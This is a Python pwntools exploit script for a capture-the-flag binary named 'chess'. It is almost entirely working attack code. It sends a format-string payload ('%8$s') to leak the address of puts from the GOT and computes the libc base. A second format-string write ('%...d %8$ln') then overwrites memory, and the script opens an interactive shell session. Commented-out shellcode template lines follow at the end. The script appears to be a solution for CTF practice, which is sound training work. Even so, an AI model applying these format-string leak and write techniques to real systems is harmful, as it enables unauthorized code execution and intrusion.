#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenges.ctfd.io --port 30458 chess
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chess')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30458)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    return process(["./ld-2.23.so",  "--library-path", ".", "./chess"] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc=ELF("libc.so.6")

io = start()

symbol = "puts"

#io.interactive()
io.recvuntil("3) Quit")
io.sendline("1")
io.recvuntil(">>")
io.sendline((p64(exe.got[symbol])[:3] + b"A").ljust(8, b"\x00"))
io.recvuntil(">>")
payload = b"Ra1 "
payload += b"%8$s"

io.sendline(payload)

io.recvuntil("winning move was:")
io.recvline()
data = io.recvline().replace(b"Ra1 ", b"").strip()
addr = u64(data.ljust(8, b"\x00"))
print(symbol + ": " + hex(addr))

libc.address = addr - libc.symbols[symbol]
print(hex(libc.symbols[symbol]))

io.recvuntil("- Qg7")
payload = b"Qg7 "
payload += b"%4198773d %8$ln"
io.sendline(payload)
io.recvuntil("Welcome")
io.interactive()
#gdb.attach(io)

#printf: 0x7f447ac5a810

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#

